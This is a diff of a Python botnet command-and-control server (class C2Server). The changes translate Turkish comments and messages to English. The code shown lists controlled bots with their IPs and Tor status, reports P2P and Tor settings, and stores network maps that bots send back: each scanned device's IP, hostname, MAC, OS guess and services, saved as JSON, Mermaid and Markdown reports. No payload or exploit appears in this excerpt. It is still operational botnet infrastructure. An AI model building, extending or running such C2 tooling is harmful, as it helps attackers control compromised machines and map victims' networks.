-            # Disk kullanımı
+            # Disk usage
             print(f"\n\033[95m💾 Disk Usage:\033[0m")
             try:
                 import shutil
@@ -2869,33 +3802,33 @@ class C2Server:
             print(f"\033[91m[!] Error showing files: {str(e)}\033[0m")
     
     def _show_network(self):
-        """Network bilgilerini gösterir"""
+        """Show network information"""
         try:
             print("\n\033[95m🌐 Network Information:\033[0m")
             print("=" * 60)
             
-            # Server network bilgileri
+            # Server network information
             print(f"  \033[96m•\033[0m Server Host: \033[93m{self.host}\033[0m")
             print(f"  \033[96m•\033[0m Server Port: \033[93m{self.port}\033[0m")
             print(f"  \033[96m•\033[0m IPv6 Support: \033[93m{'Enabled' if self.ipv6_enabled else 'Disabled'}\033[0m")
             
-            # P2P network bilgileri
+            # P2P network information
             print(f"\n\033[95m🔗 P2P Network:\033[0m")
             print(f"  \033[96m•\033[0m P2P Port Range: \033[93m{self.p2p_port_range}\033[0m")
             print(f"  \033[96m•\033[0m Active P2P Networks: \033[93m{len([s for s in self.p2p_status.values() if s['status'] == 'active'])}\033[0m")
             
-            # Tor network bilgileri
+            # Tor network information
             print(f"\n\033[95m🔒 Tor Network:\033[0m")
             print(f"  \033[96m•\033[0m Tor Enabled: \033[93m{'Yes' if self.tor_enabled else 'No'}\033[0m")
             print(f"  \033[96m•\033[0m Tor Port: \033[93m{self.tor_port}\033[0m")
             print(f"  \033[96m•\033[0m Tor Bots: \033[93m{len([bot for bot in self.bots.values() if bot.get('tor_enabled', False)])}\033[0m")
             
-            # Network maps bilgileri
+            # Network maps information
             print(f"\n\033[95m🗺️ Network Maps:\033[0m")
             print(f"  \033[96m•\033[0m Total Maps: \033[93m{len(self.network_maps)}\033[0m")
             print(f"  \033[96m•\033[0m Maps Directory: \033[93m{self.network_maps_dir}\033[0m")
             
-            # Bot network bilgileri
+            # Bot network information
             with self.lock:
                 if self.bots:
                     print(f"\n\033[95m🤖 Bot Network:\033[0m")
@@ -2903,9 +3836,9 @@ class C2Server:
                     print(f"  \033[96m•\033[0m Tor Bots: \033[94m{len([bot for bot in self.bots.values() if bot.get('tor_enabled', False)])}\033[0m")
                     print(f"  \033[96m•\033[0m Clearnet Bots: \033[92m{len([bot for bot in self.bots.values() if not bot.get('tor_enabled', False)])}\033[0m")
                     
-                    # Bot IP'leri
+                    # Bot IPs
                     print(f"  \033[96m•\033[0m Bot IPs:")
-                    for bot_id, bot_info in list(self.bots.items())[:5]:  # İlk 5 bot
+                    for bot_id, bot_info in list(self.bots.items())[:5]:  # First 5 bots
                         ip = bot_info.get('ip', 'Unknown')
                         tor_status = " (Tor)" if bot_info.get('tor_enabled', False) else ""
                         print(f"     - {bot_id}: {ip}{tor_status}")
@@ -2920,35 +3853,35 @@ class C2Server:
             print(f"\033[91m[!] Error showing network: {str(e)}\033[0m")
     
     def _process_network_map(self, bot_id, network_data, map_format, scope, timestamp):
-        """Network map verilerini işler ve kaydeder"""
+        """Process and save network map data"""
         try:
-            # Güvenli dosya adı oluştur
+            # Create safe filename
             safe_scope = scope.replace('/', '_').replace('\\', '_').replace(':', '_')
             safe_timestamp = datetime.fromtimestamp(timestamp).strftime('%Y%m%d_%H%M%S')
             filename = f"map_{safe_scope}_{safe_timestamp}"
             
-            # Bot için dizin oluştur
+            # Create directory for bot
             bot_dir = os.path.join(self.network_maps_dir, bot_id)
             os.makedirs(bot_dir, exist_ok=True)
             
-            # JSON verilerini kaydet
+            # Save JSON data
             json_file = os.path.join(bot_dir, f"{filename}.json")
             with open(json_file, 'w', encoding='utf-8') as f:
                 json.dump(network_data, f, indent=2, ensure_ascii=False)
             
-            # Mermaid diyagramı oluştur
+            # Create Mermaid diagram
             mermaid_content = self._create_mermaid_diagram(network_data)
             mermaid_file = os.path.join(bot_dir, f"{filename}.mmd")
             with open(mermaid_file, 'w', encoding='utf-8') as f:
                 f.write(mermaid_content)
             
-            # Markdown raporu oluştur
+            # Create Markdown report
             markdown_content = self._create_markdown_report(network_data, scope, timestamp)
             markdown_file = os.path.join(bot_dir, f"{filename}.md")
             with open(markdown_file, 'w', encoding='utf-8') as f:
                 f.write(markdown_content)
             
-            # Network map verilerini kaydet
+            # Save network map data
             with self.lock:
                 self.network_maps[bot_id] = {
                     'scope': scope,
@@ -2962,20 +3895,20 @@ class C2Server:
                     }
                 }
             
-            print(f"\033[92m[+] Network map kaydedildi: {bot_id} - {scope}")
-            print(f"\033[94m[*] Dosyalar: {bot_dir}\033[0m")
+            print(f"\033[92m[+] Network map saved: {bot_id} - {scope}")
+            print(f"\033[94m[*] Files: {bot_dir}\033[0m")
             
         except Exception as e:
-            print(f"\033[91m[!] Network map işleme hatası: {str(e)}\033[0m")
+            print(f"\033[91m[!] Network map processing error: {str(e)}\033[0m")
     
     def _create_mermaid_diagram(self, network_data):
-        """Network verilerinden Mermaid diyagramı oluşturur"""
+        """Create Mermaid diagram from network data"""
         nodes = network_data.get('nodes', [])
         links = network_data.get('links', [])
         
         mermaid_lines = ["graph TD"]
         
-        # Node'ları ekle
+        # Add nodes
         for node in nodes:
             node_id = node.get('id', 'unknown')
             ip = node.get('ip', 'N/A')
@@ -2984,12 +3917,12 @@ class C2Server:
             os_guess = node.get('os_guess', 'Unknown')
             role = node.get('role', 'unknown')
             
-            # Node etiketi oluştur
+            # Create node label
             label = f"{ip}<br/>{hostname}<br/>MAC: {mac}<br/>OS: {os_guess}<br/>Role: {role}"
             
             mermaid_lines.append(f"    {node_id}[\"{label}\"]")
         
-        # Link'leri ekle
+        # Add links
         for link in links:
             source = link.get('source', '')
             target = link.get('target', '')
@@ -3004,21 +3937,21 @@ class C2Server:
         return "\n".join(mermaid_lines)
     
     def _create_markdown_report(self, network_data, scope, timestamp):
-        """Network verilerinden Markdown raporu oluşturur"""
+        """Create Markdown report from network data"""
         nodes = network_data.get('nodes', [])
         links = network_data.get('links', [])
         
-        report = f"""# Network Map Raporu
+        report = f"""# Network Map Report
 
-## Genel Bilgiler
-- **Kapsam**: {scope}
-- **Tarih**: {datetime.fromtimestamp(timestamp).strftime('%Y-%m-%d %H:%M:%S')}
-- **Toplam Cihaz**: {len(nodes)}
-- **Toplam Bağlantı**: {len(links)}
+## General Information
+- **Scope**: {scope}
+- **Date**: {datetime.fromtimestamp(timestamp).strftime('%Y-%m-%d %H:%M:%S')}
+- **Total Devices**: {len(nodes)}
+- **Total Connections**: {len(links)}
 
-## Cihaz Listesi
+## Device List
 
-| IP | Hostname | MAC | OS | Role | Servisler |
+| IP | Hostname | MAC | OS | Role | Services |
 |---|---|---|---|---|---|
 """
         
@@ -3034,7 +3967,7 @@ class C2Server:
             
             report += f"| {ip} | {hostname} | {mac} | {os_guess} | {role} | {services_str} |\n"
         
-        report += "\n## Bağlantılar\n\n"
+        report += "\n## Connections\n\n"
         
         for link in links:
             source = link.get('source', 'source')
@@ -3047,7 +3980,7 @@ class C2Server:
         return report
     
     def get_network_maps_status(self):
-        """Network maps durumunu döndürür"""
+        """Return network maps status"""
         return {
             'enabled': self.network_maps_enabled,
             'total_maps': len(self.network_maps),
